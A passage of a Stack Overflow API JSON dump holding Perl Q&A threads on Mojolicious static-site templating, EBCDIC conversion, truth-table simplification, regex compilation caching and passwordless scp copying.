}\n\n    return $result;\n}\n</code></pre>\n\n<p>This approach is not terribly elegant, but it works without having to pull in all the rest of Mojolicious (particularly controllers, which are pointless for a static site). Some time later I switched to a different template engine that supports template inheritance out of the box, without such extensive workarounds.</p>\n"}, {"tags": [], "owner": {"reputation": 3574, "user_id": 676192, "user_type": "registered", "accept_rate": 72, "profile_image": "https://www.gravatar.com/avatar/fcef8c55deae46cc0bfe986b2c189f70?s=128&d=identicon&r=PG", "display_name": "simone", "link": "https://stackoverflow.com/users/676192/simone"}, "is_accepted": false, "score": 3, "last_activity_date": 1520880013, "creation_date": 1520880013, "answer_id": 49242349, "question_id": 49230849, "link": "https://stackoverflow.com/questions/49230849/can-i-use-mojolicious-to-build-a-static-site/49242349#49242349", "title": "Can I use Mojolicious to build a static site?", "body": "<p>Adding another (minimal) way to do this:</p>\n\n<pre><code>use Mojolicious;\n\nmy $m = Mojolicious-&gt;new-&gt;log(Mojo::Log-&gt;new);\nmy $r = $m-&gt;renderer;\n\npush @{$r-&gt;paths}, './templates';\n\nmy $c = Mojolicious::Controller-&gt;new-&gt;app($m);\n\nmy ($output, $format) = $r-&gt;render($c, { template =&gt; 'index' });\nprint $output\n</code></pre>\n\n<p>Iterating this through a number of templates, and sending the output to appropriately named files should be straightforward. </p>\n"}, {"tags": [], "owner": {"reputation": 5099, "user_id": 406224, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/9bc79fa6fa58e2a4f5e6c2f803cabc48?s=128&d=identicon&r=PG", "display_name": "oalders", "link": "https://stackoverflow.com/users/406224/oalders"}, "is_accepted": false, "score": 2, "last_activity_date": 1520880242, "creation_date": 1520880242, "answer_id": 49242423, "question_id": 49230849, "link": "https://stackoverflow.com/questions/49230849/can-i-use-mojolicious-to-build-a-static-site/49242423#49242423", "title": "Can I use Mojolicious to build a static site?", "body": "<p>If you run your Mojo app via <code>Plack</code> then you can use <a href=\"https://metacpan.org/pod/wallflower\" rel=\"nofollow noreferrer\">https://metacpan.org/pod/wallflower</a> to create a static site from your app.</p>\n"}], "owner": {"reputation": 3574, "user_id": 676192, "user_type": "registered", "accept_rate": 72, "profile_image": "https://www.gravatar.com/avatar/fcef8c55deae46cc0bfe986b2c189f70?s=128&d=identicon&r=PG", "display_name": "simone", "link": "https://stackoverflow.com/users/676192/simone"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 414, "favorite_count": 1, "accepted_answer_id": 49237461, "answer_count": 3, "score": 3, "last_activity_date": 1520880242, "creation_date": 1520843093, "question_id": 49230849, "link": "https://stackoverflow.com/questions/49230849/can-i-use-mojolicious-to-build-a-static-site", "title": "Can I use Mojolicious to build a static site?", "body": "<p>Is it possible to use the Mojolicious template system to build a static website?</p>\n\n<p>I'm trying to use a (skeleton) script like this:</p>\n\n<pre><code>use Mojo::Template;\nuse Mojolicious::Plugin::DefaultHelpers;\nuse Mojolicious::Plugin::TagHelpers;\n\nmy $mt = Mojo::Template-&gt;new;\nprint $mt-&gt;render_file('index.html.ep');\n</code></pre>\n\n<p>Where <code>index.html.ep</code> is like this:</p>\n\n<pre><code>% layout 'default';\nThis is a foo\n</code></pre>\n\n<p>However I get an error nessage:</p>\n\n<pre><code>String found where operator expected at index.html.ep line 1, near \"layout 'default'\"\n    (Do you need to predeclare layout?)\nsyntax error at index.html.ep line 1, near \"layout 'default'\"\n1: % layout 'default';\n2: This is a foo\n</code></pre>\n\n<p>Obviously, if I omit <code>% layout 'default';</code> all is good, but being able to reuse snippets and layout is the whole point.</p>\n\n<p>I <em>know</em> I could use Template Toolkit or some other templating system, but I want to avoid the cognitive friction of using multiple systems if at possible.</p>\n\n<p>I'm also aware that I could start up mojolicious as a server and wget all the pages, but it seems overkill.</p>\n\n<p>Any help here?</p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 154, "user_id": 9197000, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8b5e566b69bcc601535bed29bb72ef66?s=128&d=identicon&r=PG&f=1", "display_name": "telcoM", "link": "https://stackoverflow.com/users/9197000/telcom"}, "edited": false, "score": 0, "creation_date": 1520931063, "post_id": 49252462, "comment_id": 85508248, "body": "This is essentially a programming question, and would be best placed in Stack Overflow."}], "answers": [{"tags": [], "owner": {"reputation": 13, "user_id": 9368561, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/WgLFE.jpg?s=128&g=1", "display_name": "yahol", "link": "https://stackoverflow.com/users/9368561/yahol"}, "is_accepted": false, "score": 1, "last_activity_date": 1520841501, "last_edit_date": 1592644375, "creation_date": 1520841340, "answer_id": 49252463, "question_id": 49252462, "link": "https://stackoverflow.com/questions/49252462/converting-ebcdic-to-ascii-in-perl/49252463#49252463", "title": "converting EBCDIC to ASCII in Perl", "body": "<p>I've found a Perl module that can help with that, however I did not use it, so i cannot help you further. By looking at its documentation, it looks simple though.</p>\n<blockquote>\n<p><a href=\"https://metacpan.org/pod/distribution/Convert-EBCDIC/lib/Convert/EBCDIC.pm\" rel=\"nofollow noreferrer\">Convert::EBCDIC</a></p>\n<p>Convert::EBCDIC, ascii2ebcdic, ebcdic2ascii - Perl module for string\nconversion between EBCDIC and ASCII</p>\n</blockquote>\n<p>Example usage from module's description:</p>\n<pre><code>use Convert::EBCDIC;\n$ascii_string = ebcdic2ascii($ebcdic_string);\n$ebcdic_string = ascci2ebcdic($ascii_string);\n \n$translator = new Convert::EBCDIC;\n$translator = new Convert::EBCDIC($table);\n$ascii_string = $translator-&gt;toascii($ebcdic_string);\n$ebcdic_string = $translator-&gt;toebcdic($ascii_string);\n \n$Convert::EBCDIC::ccsid819\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 8543, "user_id": 5008284, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/AvSMy.jpg?s=128&g=1", "display_name": "meuh", "link": "https://stackoverflow.com/users/5008284/meuh"}, "is_accepted": false, "score": 0, "last_activity_date": 1520860916, "creation_date": 1520860916, "answer_id": 49252464, "question_id": 49252462, "link": "https://stackoverflow.com/questions/49252462/converting-ebcdic-to-ascii-in-perl/49252464#49252464", "title": "converting EBCDIC to ASCII in Perl", "body": "<p>perl from 5.8 has built-in EBCDIC handling with <code>Encode</code>. See the man page <a href=\"https://perldoc.perl.org/perlebcdic.html\" rel=\"nofollow noreferrer\">perlebcdic</a> for details and examples.  There are several EBCDIC variants. <code>dd conv=ascii</code> and the reverse <code>dd conv=ebcdic</code> seems to use code page <code>cp1047</code>, so the following should work:</p>\n\n<pre><code>echo 'abcdefghijklmnopqrstuvwxyz[]&lt;&gt;()01234567689' |\ndd conv=ebcdic | \nperl -e '\nuse Encode \"from_to\";\n$a = &lt;&gt;;\nfrom_to($a,\"cp1047\",\"latin1\");\nprint $a.\"\\n\";\n' - |\ncat -vet\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "is_accepted": false, "score": 0, "last_activity_date": 1521114516, "creation_date": 1521114516, "answer_id": 49298690, "question_id": 49252462, "link": "https://stackoverflow.com/questions/49252462/converting-ebcdic-to-ascii-in-perl/49298690#49298690", "title": "converting EBCDIC to ASCII in Perl", "body": "<p>Use the <a href=\"https://metacpan.org/pod/Encode\" rel=\"nofollow noreferrer\">Encode</a> module (which has been a standard part of the Perl distribution since Per l5.8.0 in 2002).</p>\n\n<p>Either use <code>decode()</code> to convert your EBCDIC into Perl characters and <code>encode()</code> to convert your characters into ASCII, or use <code>from_to()</code> to carry out the conversion in a single step.</p>\n"}], "migrated_from": {"other_site": {"aliases": ["http://linux.stackexchange.com"], "markdown_extensions": ["Prettify"], "launch_date": 1294871917, "open_beta_date": 1282071600, "closed_beta_date": 1281466800, "site_state": "normal", "high_resolution_icon_url": "https://cdn.sstatic.net/Sites/unix/Img/apple-touch-icon@2.png", "favicon_url": "https://cdn.sstatic.net/Sites/unix/Img/favicon.ico", "icon_url": "https://cdn.sstatic.net/Sites/unix/Img/apple-touch-icon.png", "audience": "users of Linux, FreeBSD and other Un*x-like operating systems", "site_url": "https://unix.stackexchange.com", "api_site_parameter": "unix", "logo_url": "https://cdn.sstatic.net/Sites/unix/Img/logo.png", "name": "Unix &amp; Linux", "site_type": "main_site"}, "on_date": 1520933179, "question_id": 429675}, "owner": {"reputation": 25, "user_id": 8254578, "user_type": "registered", "accept_rate": 0, "profile_image": "https://lh5.googleusercontent.com/-WWnaKx3gglw/AAAAAAAAAAI/AAAAAAAAAD4/YFCxv1juZ9s/photo.jpg?sz=128", "display_name": "Deep Mukherjee", "link": "https://stackoverflow.com/users/8254578/deep-mukherjee"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1310, "favorite_count": 1, "answer_count": 3, "score": 1, "last_activity_date": 1521114516, "creation_date": 1520840531, "question_id": 49252462, "link": "https://stackoverflow.com/questions/49252462/converting-ebcdic-to-ascii-in-perl", "title": "converting EBCDIC to ASCII in Perl", "body": "<p>How can I convert EBCDIC to ASCII In Perl. I tried with dd command in linux and it worked fine. Can anyone help me out the same in Perl?</p>\n"}, {"tags": ["perl", "truthtable"], "comments": [{"owner": {"reputation": 117699, "user_id": 62576, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/15264f7bf48e10ce32dfa4865a13763c?s=128&d=identicon&r=PG", "display_name": "Ken White", "link": "https://stackoverflow.com/users/62576/ken-white"}, "edited": false, "score": 2, "creation_date": 1520826818, "post_id": 49227931, "comment_id": 85459342, "body": "Welcome to Stack Overflow. When you created your account here, it was suggested you take the <a href=\"https://stackoverflow.com/tour\">tour</a> and read the <a href=\"https://stackoverflow.com/help\">help center</a> pages in order to familiarize yourself with the site. Please do so before posting your next question here."}, {"owner": {"reputation": 6068, "user_id": 1799189, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/s4Pcu.jpg?s=128&g=1", "display_name": "xxfelixxx", "link": "https://stackoverflow.com/users/1799189/xxfelixxx"}, "edited": false, "score": 0, "creation_date": 1520827151, "post_id": 49227931, "comment_id": 85459407, "body": "Well...if ( 1, 0, 0, 0, 1 ) -&gt; 1 and ( 1,0,0,0,0 ) -&gt; 1 then ( 1,0,0,0,x ) -&gt; 1....and similarly for other combinations.  You could just iterate through them and figure keep track of which variables are redundant..."}, {"owner": {"reputation": 5, "user_id": 9014220, "user_type": "registered", "profile_image": "https://graph.facebook.com/1154668594666218/picture?type=large", "display_name": "M\u1ea1ch \u0110i\u1ec7n T\u1eed", "link": "https://stackoverflow.com/users/9014220/m%e1%ba%a1ch-%c4%90i%e1%bb%87n-t%e1%bb%ad"}, "reply_to_user": {"reputation": 6068, "user_id": 1799189, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/s4Pcu.jpg?s=128&g=1", "display_name": "xxfelixxx", "link": "https://stackoverflow.com/users/1799189/xxfelixxx"}, "edited": false, "score": 0, "creation_date": 1520829898, "post_id": 49227931, "comment_id": 85460034, "body": "@xxfelixxx  well  thank for your rep ! ^^ , can you tell me about n input"}], "answers": [{"tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": false, "score": 1, "last_activity_date": 1520833053, "last_edit_date": 1520833053, "creation_date": 1520831369, "answer_id": 49228453, "question_id": 49227931, "link": "https://stackoverflow.com/questions/49227931/how-can-i-do-this-in-perl-shortcut-truthtable/49228453#49228453", "title": "How can i do this in perl, shortcut truthtable", "body": "<p>Translating the matrix into code is quite simple.</p>\n\n<pre><code>sub Z {\n   my ($C2, $C1, $B2, $B1, $A) = @_;\n   return 1 if $C2 &amp;&amp; $C1;\n   return 1 if $B2 &amp;&amp; $B1;\n   return 1 if $A;\n   return 0 if !$C2 &amp;&amp; !$B1 &amp;&amp; !$A;\n   return 0 if !$C1 &amp;&amp; !$B1 &amp;&amp; !$A;\n   return 0 if !$C2 &amp;&amp; !$B2 &amp;&amp; !$A;\n   return 0 if !$C1 &amp;&amp; !$B2 &amp;&amp; !$A;\n   croak(\"Should never be reached\");\n}\n</code></pre>\n\n<p>Since all possible inputs will result in one of the returns being executed, the above simplifies to the following:</p>\n\n<pre><code>sub Z {\n   my ($C2, $C1, $B2, $B1, $A) = @_;\n   return 1 if $C2 &amp;&amp; $C1;\n   return 1 if $B2 &amp;&amp; $B1;\n   return 1 if $A;\n   return 0;\n}\n</code></pre>\n\n<p>We can easily write that as one line.</p>\n\n<pre><code>my $Z = $C2 &amp;&amp; $C1 || $B2 &amp;&amp; $B1 || $A;           # If $Z needs to be true or false.\nmy $Z = $C2 &amp;&amp; $C1 || $B2 &amp;&amp; $B1 || $A ? 1 : 0;   # If $Z needs to be 0 or 1 specifically.\n</code></pre>\n"}], "owner": {"reputation": 5, "user_id": 9014220, "user_type": "registered", "profile_image": "https://graph.facebook.com/1154668594666218/picture?type=large", "display_name": "M\u1ea1ch \u0110i\u1ec7n T\u1eed", "link": "https://stackoverflow.com/users/9014220/m%e1%ba%a1ch-%c4%90i%e1%bb%87n-t%e1%bb%ad"}, "delete_vote_count": 1, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 82, "favorite_count": 0, "closed_date": 1520835873, "answer_count": 1, "score": -6, "last_activity_date": 1520919370, "creation_date": 1520826691, "last_edit_date": 1520919370, "question_id": 49227931, "link": "https://stackoverflow.com/questions/49227931/how-can-i-do-this-in-perl-shortcut-truthtable", "closed_reason": "Needs more focus", "title": "How can i do this in perl, shortcut truthtable", "body": "<p>I have simplified a truth table of a boolean function to the following:</p>\n\n<pre><code>A       B       C1      C2      Z\n--------------------------------- \n0       0       0       0       1\n0       0       0       1       1\n0       0       1       0       1\n0       0       1       1       1\n0       1       0       0       1\n0       1       0       1       1\n0       1       1       0       1\n0       1       1       1       1\n1       0       0       0       1\n1       0       0       1       1\n1       0       1       0       1\n1       0       1       1       1\n1       1       0       0       1\n1       1       0       1       0\n1       1       1       0       0\n1       1       1       1       0\n</code></pre>\n\n<p>The truth table after being trimmed :</p>\n\n<pre><code>A       B      C1      C2       Z\n---------------------------------\n0       0       0       x       0\nx       x       x       0       0\n1       x       x       1       1\nx       1       x       1       1\nx       x       1       1       1\n</code></pre>\n\n<p>I don't know how to trim the truth table creating <code>x</code> instead of <code>1</code> or <code>0</code>.</p>\n"}, {"tags": ["perl"], "answers": [{"comments": [{"owner": {"reputation": 5900, "user_id": 931154, "user_type": "registered", "accept_rate": 97, "profile_image": "https://i.stack.imgur.com/bTrZd.jpg?s=128&g=1", "display_name": "Gregory Nisbet", "link": "https://stackoverflow.com/users/931154/gregory-nisbet"}, "edited": false, "score": 0, "creation_date": 1520826895, "post_id": 49227890, "comment_id": 85459351, "body": "How does <code>unless an interpolated variable that it contains changes</code> interact with lexical variables? Do the <code>rg</code>s in separate invocations of the function count as independent or the same variable? I&#39;m not sure how to read it."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 5900, "user_id": 931154, "user_type": "registered", "accept_rate": 97, "profile_image": "https://i.stack.imgur.com/bTrZd.jpg?s=128&g=1", "display_name": "Gregory Nisbet", "link": "https://stackoverflow.com/users/931154/gregory-nisbet"}, "edited": false, "score": 1, "creation_date": 1520827716, "post_id": 49227890, "comment_id": 85459546, "body": "@GregoryNisbet, The interpolation happens unconditionally. If the interpolated pattern is different than the interpolated pattern that was used to compile the regex, it&#39;s recompiled."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 3, "creation_date": 1520827806, "post_id": 49227890, "comment_id": 85459575, "body": "Note that interpolating a compiled pattern in another pattern currently causes the compiled pattern to be stringified and recompiled as part of the larger pattern. Only when the pattern consist entirely of a variable (e.g. <code>&#47;$re&#47;</code>) is the existing compiled pattern used. This means that passing <code>qr&#47;b+&#47;</code> instead of <code>&quot;b+&quot;</code> won&#39;t help."}], "tags": [], "owner": {"user_type": "does_not_exist", "display_name": "user2404501"}, "is_accepted": true, "score": 7, "last_activity_date": 1520829137, "last_edit_date": 1592644375, "creation_date": 1520826430, "answer_id": 49227890, "question_id": 49227638, "link": "https://stackoverflow.com/questions/49227638/does-perl-cache-regex-generation/49227890#49227890", "title": "Does perl cache regex generation?", "body": "<p>From <strong>perlop</strong>(1), under the <code>m//</code> operator:</p>\n<blockquote>\n<p>PATTERN may contain variables, which will be interpolated every time the pattern search is evaluated</p>\n<p>[...]</p>\n<p>Perl will not recompile the pattern unless an interpolated variable that it contains changes.  You can force Perl to skip the test and never recompile by adding a &quot;/o&quot; (which stands for &quot;once&quot;) after the trailing delimiter.  Once upon a time, Perl would recompile regular expressions unnecessarily, and this modifier was useful to tell it not to do so, in the interests of speed.</p>\n</blockquote>\n<p>So yes, there is a cache, and you can even force the use of the cache even when it's invalid by saying <code>/o</code>, but you really shouldn't do that.</p>\n<p>But that cache only stores one compiled regexp per instance of the <code>m//</code> or <code>s///</code> operator, so it only helps if the regexp is used with the same variables (e.g. your <code>$rg</code>) many times <em>consecutively</em>. If you alternate between calling it with <code>$rg='b+'</code> and <code>$rg='c+'</code> you will get a recompile every time.</p>\n<p>For that kind of situation, you can do your own caching with the <code>qr//</code> operator. It explicitly compiles the regexp and returns an object that you can store and use to execute the regexp later. That could be incorporated into your <code>match_here</code> like this:</p>\n<pre><code>use feature 'state';\n\nsub match_here {\n  my ($str, $index, $rg) = @_;\n  pos($str) = $index;\n  croak &quot;index ($index) out of bounds&quot; unless pos($str) == $index;\n  my $out;\n  state %rg_cache;\n  my $crg = $rg_cache{$rg} ||= qr/\\G$rg/;\n  if ($str =~ /$crg/) {\n    $out = $+[0]; \n  }\n  return $out;\n}\n</code></pre>\n<p>To add more detail on the basic cache (when not using <code>qr//</code>): the fact that <code>$rg</code> is a newly allocated lexical variable each time makes no difference. It only matters that the <em>value</em> is the same as the previous one.</p>\n<p>Here's an example to prove the point:</p>\n<pre><code>use re qw(Debug COMPILE);\n\nwhile(&lt;&gt;) {\n  chomp;\n  # Insane interpolation. Do not use anything remotely like this in real code\n  print &quot;MATCHED: $_\\n&quot; if /^${\\(`cat refile`)}/;\n}\n</code></pre>\n<p>Every time the match operator executes, it reads <code>refile</code>. The regular expression is <code>^</code> followed by the contents of <code>refile</code>. The debugging output shows that it is recompiled only if the contents of the file have changed. If the file still has the same contents as the last time, the operator notices that the same <em>string</em> is being passed to the regexp compiler again, and reuses the cached result.</p>\n<p>Or try this less dramatic example:</p>\n<pre><code>use re qw(Debug COMPILE);\n\n@patterns = (\n  '\\d{3}',\n  '\\d{3}',\n  '[aeiou]',\n  '[aeiou]',\n  '\\d{3}',\n  '\\d{3}'\n);\n\nfor ('xyz', '123', 'other') {\n  for $i (0..$#patterns) {\n    if(/$patterns[$i]/) {\n      print &quot;$_ matches $patterns[$i]\\n&quot;;\n    } else {\n      print &quot;$_ does not match $patterns[$i]\\n&quot;;\n    }\n  }\n}\n</code></pre>\n<p>in which there are 18 compilations and 11 of them are cache hits, even though the same &quot;variable&quot; (the same element of the <code>@patterns</code> array) is never used twice in a row.</p>\n"}], "owner": {"reputation": 5900, "user_id": 931154, "user_type": "registered", "accept_rate": 97, "profile_image": "https://i.stack.imgur.com/bTrZd.jpg?s=128&g=1", "display_name": "Gregory Nisbet", "link": "https://stackoverflow.com/users/931154/gregory-nisbet"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 243, "favorite_count": 1, "accepted_answer_id": 49227890, "answer_count": 1, "score": 6, "last_activity_date": 1520829137, "creation_date": 1520824152, "last_edit_date": 1520824640, "question_id": 49227638, "link": "https://stackoverflow.com/questions/49227638/does-perl-cache-regex-generation", "title": "Does perl cache regex generation?", "body": "<p>Suppose I have a function that dynamically generates regular expressions and then matches against them.</p>\n\n<p>For example, in the following function <code>match_here</code> a <code>\\G</code> anchor is inserted at the beginning of the regex. This simplifies the API because the caller does not need to remember to include the <code>pos</code> anchor in the pattern.</p>\n\n<pre><code>#!/usr/bin/env perl\nuse strict;\nuse warnings;\nuse Carp;\nuse Data::Dumper;\n\nsub match_here {\n  my ($str, $index, $rg) = @_;\n  pos($str) = $index;\n  croak \"index ($index) out of bounds\" unless pos($str) == $index;\n  my $out;\n  if ($str =~ /\\G$rg/) {\n    $out = $+[0]; \n  }\n  return $out;\n}\n\n# no match starting at position 0\n# prints '$VAR1 = undef;'    \nprint Dumper(match_here(\"abc\", 0, \"b+\"));\n# match from 1 to 2\n# prints '$VAR1 = 2;'\nprint Dumper(match_here(\"abc\", 1, \"b+\"));\n</code></pre>\n\n<p>I'm wondering whether an anonymous regex object is \"compiled\" every time the function is evaluated or if there's some caching so that identical strings will not cause additional regex objects to be compiled.</p>\n\n<p>Also, assuming that no caching is done by the Perl interpreter, is compiling a regex object expensive enough to be worth caching (possibly in an XS extension)?</p>\n"}, {"tags": ["perl", "ssh", "scp"], "comments": [{"owner": {"reputation": 2833, "user_id": 9300627, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c7a38cf029222bcf1d902e6b2759ffeb?s=128&d=identicon&r=PG", "display_name": "haukex", "link": "https://stackoverflow.com/users/9300627/haukex"}, "edited": false, "score": 2, "creation_date": 1520795492, "post_id": 49221685, "comment_id": 85451448, "body": "<a href=\"https://www.perlmonks.org/?node_id=1210666\" rel=\"nofollow noreferrer\">Crossposted to PerlMonks</a>."}], "answers": [{"comments": [{"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 2, "creation_date": 1520797160, "post_id": 49223180, "comment_id": 85452011, "body": "The &quot;<i>public key authentication</i>&quot; is the key, and I use <code>rsync</code> for transfer"}, {"owner": {"reputation": 2626, "user_id": 849967, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/137c89ef80ed860b95e68b42e0d5353e?s=128&d=identicon&r=PG", "display_name": "Kjetil S.", "link": "https://stackoverflow.com/users/849967/kjetil-s"}, "edited": false, "score": 1, "creation_date": 1520869107, "post_id": 49223180, "comment_id": 85481637, "body": "Rsync for transfer is far superior to scp when most of the files are the same each time since rsync only copies the difference. Much faster. Especially on slow lines or large and/or many files. Rsync can utilize ssh (maybe to a special user on the server) or be set up as a rsync daemon on the server. Both makes it possible to control which directories are made available (read only or read-write) and which clients (ip check) can access. Learning the intricacies of ssh/scp and rsync takes some effort but is well worth it if file transfer is part of your job."}], "tags": [], "owner": {"reputation": 9262, "user_id": 124951, "user_type": "registered", "accept_rate": 20, "profile_image": "https://www.gravatar.com/avatar/c46d5911a8fb4ffd5fb8523d56a60de0?s=128&d=identicon&r=PG", "display_name": "salva", "link": "https://stackoverflow.com/users/124951/salva"}, "is_accepted": false, "score": 4, "last_activity_date": 1520790555, "creation_date": 1520790555, "answer_id": 49223180, "question_id": 49221685, "link": "https://stackoverflow.com/questions/49221685/perl-copying-directory-from-other-machine-to-local-machine/49223180#49223180", "title": "Perl - copying directory from other machine to local machine", "body": "<p>The elegant way is to use public key authentication.</p>\n\n<p>If you really need password authentication, well, besides the ones you listed there are other modules which would allow you to automate it. Check if you have available <a href=\"https://metacpan.org/pod/Net::SSH2\" rel=\"nofollow noreferrer\">Net::SSH2</a>, <a href=\"https://metacpan.org/pod/Expect\" rel=\"nofollow noreferrer\">Expect</a> or <a href=\"https://metacpan.org/pod/IO::Pty\" rel=\"nofollow noreferrer\">IO::Pty</a>.</p>\n\n<p>You may also be able to use use some <code>ssh</code>/<code>scp</code> client accepting the password from the command line or from an environment variable* as <a href=\"https://linux.die.net/man/1/plink\" rel=\"nofollow noreferrer\">plink</a>, <a href=\"https://linux.die.net/man/1/pscp\" rel=\"nofollow noreferrer\">pscp</a> or <a href=\"https://linux.die.net/man/1/lftp\" rel=\"nofollow noreferrer\">lftp</a>.</p>\n\n<p>Another possibility is using the utility <a href=\"https://linux.die.net/man/1/sshpass\" rel=\"nofollow noreferrer\">sshpass</a>.</p>\n\n<p>(* Note that passing passwords in the command line or in environment variables is a very insecure practice!)</p>\n"}], "owner": {"reputation": 710, "user_id": 9218410, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c988d41e9d827d1c64078fa1a73bb4c8?s=128&d=identicon&r=PG&f=1", "display_name": "TTaJTa4", "link": "https://stackoverflow.com/users/9218410/ttajta4"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 244, "favorite_count": 1, "answer_count": 1, "score": 1, "last_activity_date": 1520790555, "creation_date": 1520782210, "last_edit_date": 1592644375, "question_id": 49221685, "link": "https://stackoverflow.com/questions/49221685/perl-copying-directory-from-other-machine-to-local-machine", "title": "Perl - copying directory from other machine to local machine", "body": "<p>I'm trying to write a perl script which copies a directory with files from other machine to current machine.\nI can use the <code>scp</code> command in shell but it requires a password. Also I don't have the following modules insatlled on my work area (and unfortunately I cant install them):</p>\n<blockquote>\n<p>Net::OpenSSH</p>\n<p>Net::SSH::Perl</p>\n<p>Net::SCP</p>\n<p>Net:: FTP</p>\n</blockquote>\n<p>I do have installed <code>Net::SSH</code></p>\n<p>My mission is to copy the files from other machine to current machine. The main problem is that it requires a password to use <code>scp</code> on shell. Is there any elegant way to solve this problem?</p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 55516, "user_id": 892256, "user_type": "registered", "accept_rate": 99, "profile_image": "https://i.stack.imgur.com/15FJW.png?s=128&g=1", "display_name": "Ed Heal", "link": "https://stackoverflow.com/users/892256/ed-heal"}, "edited": false, "score": 0, "creation_date": 1520770280, "post_id": 49219831, "comment_id": 85443269, "body": "You forgot to post the script bit"}, {"owner": {"reputation": 2093, "user_id": 7695039, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/7630a58c1bb8abc718c3458ff1d08af4?s=128&d=identicon&r=PG&f=1", "display_name": "johnashu", "link": "https://stackoverflow.com/users/7695039/johnashu"}, "edited": false, "score": 0, "creation_date": 1520770759, "post_id": 49219831, "comment_id": 85443423, "body": "Please create a Minimal, Complete, and Verifiable example <a href=\"https://stackoverflow.com/help/mcve\">stackoverflow.com/help/mcve</a>"}, {"owner": {"reputation": 29, "user_id": 9475065, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dd15baa3bf38f3e806f79bfc62cf1fe5?s=128&d=identicon&r=PG&f=1", "display_name": "Sonal", "link": "https://stackoverflow.com/users/9475065/sonal"}, "edited": false, "score": 0, "creation_date": 1520773563, "post_id": 49219831, "comment_id": 85444153, "body": "added my script code"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1520778967, "post_id": 49219831, "comment_id": 85445797, "body": "What happens if you have, say <code>A food 1</code> <code>B food 2</code> <code>C food 3</code>? Are all lines printed, or none?"}], "answers": [{"comments": [{"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1520778853, "post_id": 49220287, "comment_id": 85445752, "body": "<code>split &#47;\\s+&#47;, $line</code> should almost always be <code>split &quot; &quot;, $line</code>"}, {"owner": {"reputation": 2010, "user_id": 6499160, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a483ab21be9d3892e9b29047b1b3afb1?s=128&d=identicon&r=PG&f=1", "display_name": "wolfrevokcats", "link": "https://stackoverflow.com/users/6499160/wolfrevokcats"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 1, "creation_date": 1520779346, "post_id": 49220287, "comment_id": 85445924, "body": "I chose <code>&#47;\\s+&#47;</code> deliberately, so the meaning of that argument would be more explicit and clear to a person new to perl."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1520779645, "post_id": 49220287, "comment_id": 85446010, "body": "Also, your code will just print the last value for each <code>$object</code>. If the OP&#39;s data had <code>A car 69</code> before the rest of the data then your code would show <code>B car 136</code>"}, {"owner": {"reputation": 2010, "user_id": 